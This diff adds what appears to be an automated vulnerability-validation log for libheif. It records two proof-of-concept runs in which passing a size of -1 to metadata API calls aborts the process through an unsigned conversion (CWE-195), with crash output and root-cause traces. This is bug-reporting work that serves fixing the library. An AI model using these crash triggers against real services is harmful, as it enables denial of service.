@@ -1,0 +1,51 @@
+Bug 10 - Validated Output
+Docker image: vulagent/libheif:latest
+Compiler: clang++ -fsanitize=address -fno-omit-frame-pointer -g -O1
+libheif built from: /src/libheif (source tree in container)
+Date: 2026-04-17
+
+=== POC (which=1): heif_context_add_generic_metadata(ctx, hdl, dummy, -1, "test", "text/plain") ===
+Command: ./poc_trigger 1
+Expected: std::length_error -> terminate() -> abort()
+
+[+] Bug 10 POC: negative size (which=1)
+terminate called after throwing an instance of 'std::length_error'
+  what():  vector::_M_default_append
+Aborted (core dumped)
+
+Exit code: 134 (SIGABRT)
+
+Root cause trace:
+  heif_context_add_generic_metadata(ctx, hdl, dummy, -1, "test", "text/plain")
+  -> heif_metadata.cc:227  ctx->context->add_generic_metadata(hdl->image, dummy, -1, ...)
+  -> context.cc:1793        std::vector<uint8_t> data_array;
+  -> context.cc:1795        data_array.resize(-1);
+                             // (size_t)(-1) == SIZE_MAX == 18446744073709551615
+                             // std::vector::resize throws std::length_error
+  -> libc++abi: terminate called after throwing an instance of 'std::length_error'
+  -> SIGABRT
+
+=== POC (which=2): heif_context_add_XMP_metadata(ctx, hdl, dummy, -1) ===
+Command: ./poc_trigger 2
+Expected: std::length_error -> terminate() -> abort()
+
+[+] Bug 10 POC: negative size (which=2)
+terminate called after throwing an instance of 'std::length_error'
+  what():  vector::_M_default_append
+Aborted (core dumped)
+
+Exit code: 134 (SIGABRT)
+
+Root cause trace:
+  heif_context_add_XMP_metadata(ctx, hdl, dummy, -1)
+  -> heif_metadata.cc:194  heif_context_add_XMP_metadata2(ctx, hdl, dummy, -1, off)
+  -> heif_metadata.cc:207  ctx->context->add_XMP_metadata(hdl->image, dummy, -1, off)
+  -> context.cc:1728        add_generic_metadata(master_image, dummy, -1, ...)
+  -> context.cc:1795        data_array.resize(-1)  -> std::length_error -> SIGABRT
+
+=== CRASH VERDICT: CONFIRMED ===
+Both variants crash with SIGABRT (exit code 134).
+Exception: std::length_error: vector::_M_default_append
+Cause: signed int -1 implicitly cast to size_t (SIZE_MAX) in vector::resize()
+CWE-195: Signed to Unsigned Conversion Error
+Severity: Medium (DoS — process abort)
